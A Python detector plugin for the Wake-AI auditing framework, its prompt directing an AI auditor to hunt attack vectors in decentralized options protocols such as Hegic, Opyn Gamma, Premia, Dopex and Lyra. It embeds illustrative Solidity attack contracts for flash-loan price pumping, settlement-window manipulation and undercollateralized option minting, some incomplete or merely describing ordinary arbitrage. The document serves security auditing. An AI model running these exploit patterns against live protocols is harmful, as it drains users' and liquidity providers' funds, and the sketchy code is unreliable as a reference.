"""Options Protocol Attack Vectors detector for Wake-AI framework."""

from wake_ai import workflow
from wake_ai.templates import SimpleDetector


@workflow.command(name="options-protocol-attacks")
def factory():
    """Run options protocol attack vectors detector."""
    return OptionsProtocolAttacksDetector()


class OptionsProtocolAttacksDetector(SimpleDetector):
    """Advanced detector for Options Protocol attack vectors."""

    def get_detector_prompt(self) -> str:
        """Define the options protocol attack detection workflow."""
        return """# Options Protocol Attack Vectors Analysis

## Task
Perform comprehensive analysis of 5 high-severity attack vectors targeting decentralized options protocols including Hegic, Opyn Gamma, Premia 2.0, Dopex, and Lyra, focusing on pricing manipulation, settlement exploits, and liquidity attacks.

## Target Attack Vectors (All High Severity)

### 🟡 High Severity (5 vectors)
1. **Hegic Options Attack**
   - Hegic options pricing exploitation
   - Settlement manipulation attacks
   - Premium calculation bypasses
   - Exercise timing exploitation
   - Liquidity pool drainage

2. **Opyn Gamma Attack**
   - Gamma protocol manipulation
   - Vault collateral attacks
   - Automated market maker exploitation
   - Settlement price manipulation
   - Margin requirement bypasses

3. **Premia 2.0 Attack**
   - Premia pricing model exploitation
   - Pool token manipulation
   - Dynamic hedging attacks
   - Liquidity mining exploitation
   - Cross-pair arbitrage attacks

4. **Dopex Options Attack**
   - Dopex SSOV exploitation
   - Epoch-based attack timing
   - Rebate mechanism manipulation
   - Strike price gaming
   - Liquidity bootstrap attacks

5. **Lyra Options Attack**
   - Lyra AMM manipulation
   - Volatility surface attacks
   - Delta hedging exploitation
   - Market maker pool drainage
   - Cross-market arbitrage

## Analysis Process

### 1. Discovery Phase
- Map options protocol architectures
- Identify pricing mechanisms
- Locate settlement processes
- Find liquidity provision systems
- Analyze collateral requirements

### 2. Attack Vector Analysis

#### Options Pricing Manipulation
- Check pricing oracle dependencies
- Analyze volatility calculations
- Verify Black-Scholes implementations
- Look for implied volatility gaming
- Test time decay exploits

#### Settlement Process Attacks
- Map settlement trigger mechanisms
- Check exercise condition validation
- Analyze payout calculations
- Look for settlement delays
- Test oracle manipulation effects

#### Liquidity Pool Exploitation
- Check pool composition logic
- Analyze reward distribution
- Look for impermanent loss amplification
- Test liquidity withdrawal attacks
- Verify pool rebalancing mechanisms

#### Collateral and Margin Attacks
- Map collateral requirement calculations
- Check margin call mechanisms
- Analyze liquidation processes
- Look for collateral manipulation
- Test undercollateralized positions

#### Cross-Protocol Arbitrage
- Check price discrepancies
- Analyze cross-market opportunities
- Look for settlement timing differences
- Test multi-protocol strategies
- Verify arbitrage constraints

### 3. Options-Specific Exploit Patterns

#### Greeks Manipulation
- Delta hedging attacks
- Gamma scalping exploitation
- Vega volatility gaming
- Theta time decay abuse
- Rho interest rate manipulation

#### Expiry and Exercise Gaming
- Exercise timing manipulation
- Expiry settlement attacks
- American vs European exploit differences
- Assignment avoidance techniques
- Early exercise optimization

#### Volatility Surface Attacks
- Implied volatility manipulation
- Volatility smile exploitation
- Term structure gaming
- Skew manipulation attacks
- Surface arbitrage opportunities

## Documentation Requirements

For each options attack:
- **Protocol Affected**: Specific options platform
- **Attack Category**: Pricing, settlement, liquidity, or arbitrage
- **Options Details**: Strike, expiry, option type affected
- **Market Conditions**: Required volatility/price environment
- **Profit Calculation**: Expected returns from exploit
- **Risk Assessment**: Potential losses and detection risk
- **Mitigation**: Protocol-specific defensive measures

## Validation Criteria
- Test with realistic options parameters
- Consider market volatility impacts
- Verify mathematical soundness
- Account for gas costs and slippage
- Provide options-specific fixes

## Special Focus Areas

### Hegic Options Pricing Exploit
```solidity
// Hegic pricing manipulation:
contract HegicAttack {
    IHegicOptions public hegic;
    IPriceProvider public priceProvider;
    
    function exploitHegicPricing() external {
        // Step 1: Manipulate underlying price via flash loan
        uint256 flashAmount = 10000 ether;
        flashLoan(flashAmount, abi.encodeWithSelector(this.executePricingAttack.selector));
    }
    
    function executePricingAttack() external {
        // Step 2: Massive buy to pump price
        uniswapV2.swapExactETHForTokens{value: 5000 ether}(
            0,
            getPathForETHtoToken(),
            address(this),
            block.timestamp + 300
        );
        
        // Step 3: Buy options at old (low) premium
        uint256 optionCost = hegic.fees(
            block.timestamp + 86400, // 1 day expiry
            1000 ether, // amount
            2000e8, // strike price (old price)
            IHegicOptions.OptionType.Call
        );
        
        hegic.create{value: optionCost}(
            block.timestamp + 86400,
            1000 ether,
            2000e8,
            IHegicOptions.OptionType.Call
        );
        
        // Step 4: Exercise immediately at higher price
        hegic.exercise(optionId);
        
        // Step 5: Sell tokens and repay flash loan
        sellTokensAndRepayLoan();
    }
}
```

### Opyn Gamma Vault Attack
```solidity
// Opyn Gamma protocol exploitation:
contract OpynGammaAttack {
    IController public controller;
    IMarginCalculator public calculator;
    
    function exploitGammaVault() external {
        // Step 1: Create vault with minimal collateral
        uint256 vaultId = controller.getAccountVaultCounter(address(this)) + 1;
        
        ActionArgs[] memory actions = new ActionArgs[](2);
        
        // Open vault
        actions[0] = ActionArgs({
            actionType: ActionType.OpenVault,
            owner: address(this),
            secondAddress: address(this),
            asset: address(0),
            vaultId: vaultId,
            amount: 0,
            index: 0,
            data: ""
        });
        
        // Add minimal collateral
        actions[1] = ActionArgs({
            actionType: ActionType.DepositCollateral,
            owner: address(this),
            secondAddress: address(this),
            asset: address(weth),
            vaultId: vaultId,
            amount: 1 ether, // Minimal collateral
            index: 0,
            data: ""
        });
        
        controller.operate(actions);
        
        // Step 2: Mint maximum options with minimal collateral
        exploitMarginCalculation(vaultId);
    }
    
    function exploitMarginCalculation(uint256 vaultId) internal {
        // Exploit: Margin calculator doesn't account for all risk factors
        ActionArgs[] memory actions = new ActionArgs[](1);
        
        actions[0] = ActionArgs({
            actionType: ActionType.MintShortOption,
            owner: address(this),
            secondAddress: address(this),
            asset: address(oToken), // Out-of-the-money option
            vaultId: vaultId,
            amount: 100 * 1e8, // 100 options
            index: 0,
            data: ""
        });
        
        controller.operate(actions);
        
        // Sell minted options for immediate profit
        sellOptionsForProfit();
    }
}
```

### Premia 2.0 Pool Manipulation
```solidity
// Premia 2.0 liquidity attack:
contract PremiaAttack {
    IPremiaPool public premiaPool;
    IPremiaStaking public staking;
    
    function manipulatePremiaPool() external {
        // Step 1: Become large liquidity provider
        uint256 liquidity = 1000000e18;
        premiaPool.deposit(liquidity, address(this));
        
        // Step 2: Manipulate pool composition
        manipulatePoolRatios();
        
        // Step 3: Buy options at manipulated prices
        buyManipulatedOptions();
        
        // Step 4: Restore pool and exercise options
        restorePoolAndExercise();
    }
    
    function manipulatePoolRatios() internal {
        // Flash loan to temporarily skew pool composition
        uint256 flashAmount = 5000000e18;
        aaveFlashLoan(flashAmount, abi.encodeWithSelector(this.executePoolManipulation.selector));
    }
    
    function executePoolManipulation() external {
        // Temporarily drain one side of the pool
        premiaPool.withdraw(premiaPool.balanceOf(address(this)) / 2, address(this));
        
        // This skews the pricing model
        // Buy options at favorable prices
        uint256 optionCost = premiaPool.quote(
            true, // isCall
            1000e18, // size
            block.timestamp + 86400 // expiry
        );
        
        premiaPool.writeOption(
            true,
            1000e18,
            block.timestamp + 86400
        );
        
        // Restore liquidity
        premiaPool.deposit(premiaPool.balanceOf(address(this)), address(this));
    }
}
```

### Dopex SSOV Epoch Attack
```solidity
// Dopex Single Staking Options Vault attack:
contract DopexAttack {
    ISsovV3 public ssov;
    IERC20 public dpx;
    
    function exploitDopexSSOV() external {
        // Step 1: Wait for optimal epoch timing
        uint256 currentEpoch = ssov.currentEpoch();
        
        // Step 2: Deposit large amount just before epoch ends
        uint256 depositAmount = 10000e18;
        dpx.approve(address(ssov), depositAmount);
        ssov.deposit(2, depositAmount, address(this)); // Strike index 2
        
        // Step 3: Immediately after epoch start, manipulate underlying price
        manipulateUnderlyingPrice();
        
        // Step 4: Exercise all options if profitable
        if (isExerciseProfitable()) {
            exerciseAllOptions();
        }
        
        // Step 5: Collect rebates and rewards
        collectRebatesAndRewards();
    }
    
    function manipulateUnderlyingPrice() internal {
        // Use flash loan to temporarily pump DPX price
        uint256 flashAmount = 50000e18;
        balancerFlashLoan(flashAmount, abi.encodeWithSelector(this.executePriceManipulation.selector));
    }
    
    function executePriceManipulation() external {
        // Pump DPX price above strike
        sushiswapRouter.swapExactETHForTokens{value: 25000 ether}(
            0,
            getPathForETHToDPX(),
            address(this),
            block.timestamp + 300
        );
        
        // Exercise options at manipulated price
        ssov.settle(2, address(this), ssov.userStrikesData(2, address(this)));
        
        // Dump DPX and repay flash loan
        sushiswapRouter.swapExactTokensForETH(
            dpx.balanceOf(address(this)),
            0,
            getPathForDPXToETH(),
            address(this),
            block.timestamp + 300
        );
    }
}
```

### Lyra AMM Volatility Attack
```solidity
// Lyra options AMM manipulation:
contract LyraAttack {
    ILyraMarket public lyraMarket;
    IOptionMarket public optionMarket;
    
    function exploitLyraVolatility() external {
        // Step 1: Identify volatility surface inefficiencies
        uint256[] memory strikes = getAvailableStrikes();
        uint256[] memory expiries = getAvailableExpiries();
        
        // Step 2: Execute volatility arbitrage
        executeVolatilityArbitrage(strikes, expiries);
        
        // Step 3: Delta hedge positions
        hedgePositions();
        
        // Step 4: Unwind at profit
        unwindPositions();
    }
    
    function executeVolatilityArbitrage(uint256[] memory strikes, uint256[] memory expiries) internal {
        for (uint i = 0; i < strikes.length; i++) {
            for (uint j = 0; j < expiries.length; j++) {
                // Check if implied volatility is mispriced
                uint256 impliedVol = lyraMarket.getImpliedVolatility(strikes[i], expiries[j]);
                uint256 realizedVol = calculateRealizedVolatility();
                
                if (impliedVol < realizedVol * 80 / 100) { // 20% underpriced
                    // Buy underpriced options
                    TradeInputParameters memory tradeParams = TradeInputParameters({
                        strikeId: getStrikeId(strikes[i], expiries[j]),
                        positionId: 0,
                        optionType: OptionType.LONG_CALL,
                        amount: 10e18,
                        setCollateralTo: 0,
                        iterations: 1,
                        minTotalCost: 0,
                        maxTotalCost: type(uint).max,
                        referrer: address(0)
                    });
                    
                    optionMarket.openPosition(tradeParams);
                }
            }
        }
    }
    
    function hedgePositions() internal {
        // Calculate net delta exposure
        int256 netDelta = calculateNetDelta();
        
        // Hedge via spot market
        if (netDelta > 0) {
            // Short spot to hedge long delta
            shortSpotPosition(uint256(netDelta));
        } else if (netDelta < 0) {
            // Long spot to hedge short delta
            longSpotPosition(uint256(-netDelta));
        }
    }
}
```

### Cross-Protocol Options Arbitrage
```solidity
// Multi-protocol options arbitrage:
contract CrossProtocolOptionsArbitrage {
    mapping(string => address) public protocols;
    
    function executeCrossProtocolArbitrage() external {
        // Step 1: Find price discrepancies across protocols
        OptionParams memory params = OptionParams({
            underlying: address(weth),
            strike: 2000e8,
            expiry: block.timestamp + 86400,
            isCall: true,
            amount: 10e18
        });
        
        uint256 hegicPrice = getHegicPrice(params);
        uint256 opynPrice = getOpynPrice(params);
        uint256 premiaPrice = getPremiaPrice(params);
        uint256 lyraPrice = getLyraPrice(params);
        
        // Step 2: Buy from cheapest, sell to most expensive
        uint256 minPrice = min(hegicPrice, opynPrice, premiaPrice, lyraPrice);
        uint256 maxPrice = max(hegicPrice, opynPrice, premiaPrice, lyraPrice);
        
        if (maxPrice > minPrice * 110 / 100) { // 10% arbitrage opportunity
            buyFromCheapestProtocol(params, minPrice);
            sellToExpensiveProtocol(params, maxPrice);
        }
        
        // Step 3: Hedge net exposure
        hedgeNetExposure();
    }
    
    function getHegicPrice(OptionParams memory params) internal view returns (uint256) {
        return IHegicOptions(protocols["hegic"]).fees(
            params.expiry,
            params.amount,
            params.strike,
            params.isCall ? IHegicOptions.OptionType.Call : IHegicOptions.OptionType.Put
        );
    }
    
    function executeOptionsArbitrage(
        address buyProtocol,
        address sellProtocol,
        OptionParams memory params
    ) internal {
        // Buy options from cheaper protocol
        if (buyProtocol == protocols["hegic"]) {
            buyHegicOption(params);
        } else if (buyProtocol == protocols["opyn"]) {
            buyOpynOption(params);
        }
        // ... other protocols
        
        // Sell options on more expensive protocol
        if (sellProtocol == protocols["premia"]) {
            sellPremiaOption(params);
        } else if (sellProtocol == protocols["lyra"]) {
            sellLyraOption(params);
        }
        // ... other protocols
    }
}
```

### Options Settlement Manipulation
```solidity
// Settlement price manipulation attack:
contract SettlementManipulation {
    IChainlinkOracle public oracle;
    
    function manipulateSettlement() external {
        // Step 1: Identify settlement window
        uint256 settlementTime = getNextSettlementTime();
        
        // Step 2: Flash loan large amount near settlement
        require(block.timestamp >= settlementTime - 300, "Too early");
        require(block.timestamp <= settlementTime + 300, "Too late");
        
        uint256 flashAmount = 100000e18;
        balancerFlashLoan(flashAmount, abi.encodeWithSelector(this.executeSettlementAttack.selector));
    }
    
    function executeSettlementAttack() external {
        // Step 3: Manipulate underlying price during settlement window
        // Large buy to pump price above strike
        uniswapV3.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(weth),
                tokenOut: address(underlying),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp + 100,
                amountIn: 50000e18,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        
        // Step 4: Trigger settlement at manipulated price
        triggerSettlement();
        
        // Step 5: Reverse trade and repay flash loan
        uniswapV3.exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(underlying),
                tokenOut: address(weth),
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp + 100,
                amountIn: underlying.balanceOf(address(this)),
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }
}
```

Focus on identifying vulnerabilities specific to decentralized options protocols, including pricing model manipulation, settlement process exploits, liquidity provision attacks, and cross-protocol arbitrage opportunities. Pay special attention to the mathematical models used for options pricing and the oracle dependencies for settlement."""